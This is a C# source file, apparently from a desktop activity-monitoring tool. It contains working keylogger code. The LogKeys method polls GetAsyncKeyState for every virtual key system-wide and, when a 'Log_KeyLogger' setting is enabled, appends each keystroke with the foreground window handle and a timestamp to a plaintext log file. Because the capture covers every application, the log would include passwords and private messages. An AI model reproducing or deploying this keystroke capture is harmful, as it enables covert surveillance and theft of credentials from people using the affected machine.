using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data;

using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;

namespace CrcMrc
{
    class common
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll")]
        static extern IntPtr GetActiveWindow();
        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_CLOSE = 0xF060;
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        public Int32[] iHwnd = new Int32[0];
        public Int32 iCount = 0;
        public Int32 iCountStop = 100;

        public Int32[] iHwndView = new Int32[0]; // view application


        public void LogKeys()
        {
            iCount = 0;            
            String path = @"KeyLog.txt";
            path = Properties.Settings.Default.FileName;

            if (CrcMrc.Properties.Settings.Default.Log_KeyLogger)
            {
                if (!File.Exists(path))
                {
                    using (StreamWriter sw = File.CreateText(path))
                    {
                    }
                }
            }

            KeysConverter converter = new KeysConverter();
            String text = "";
            while (true)
            {
                Thread.Sleep(10);
                iCount++;
                if (iCount > iCountStop)
                {
                    break;
                }

                for (Int32 i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);
                    Int32 hwnd = 0;
                    try
                    {
                        hwnd = GetForegroundWindow().ToInt32();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("error 7 " + ex.Message.ToString());
                    }

                    if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);
                        if (CrcMrc.Properties.Settings.Default.Log_KeyLogger) {
                                using (StreamWriter sw = File.AppendText(path))
                                {                                    
                                    sw.WriteLine(hwnd.ToString().PadRight(15) + text.PadRight(20) + "@ " + DateTime.Now.ToString());                                    
                                }
                            }
                        Array.Resize(ref iHwnd, iHwnd.Length + 1);
                        iHwnd.SetValue(hwnd, iHwnd.Length - 1);
                        break;
                    }
                }
            }
        }

        public void ViewOnly()
        {
            if (iHwnd.Length != 0) return;
            Int32 hwnd = 0;
            try
            {
                hwnd = GetForegroundWindow().ToInt32();
                Array.Resize(ref iHwndView, iHwndView.Length + 1);
                iHwndView.SetValue(hwnd, iHwndView.Length - 1);
            }
            catch (Exception ex)
            {
                Console.WriteLine("view error 6" + ex.Message.ToString());
            }
        }

        public void ResetCounter()
        {
            Array.Clear(iHwnd, 0, iHwnd.Length);
            iHwnd = new Int32[0];

            Array.Clear(iHwndView, 0, iHwndView.Length);
            iHwndView = new Int32[0];
        }


    }
}
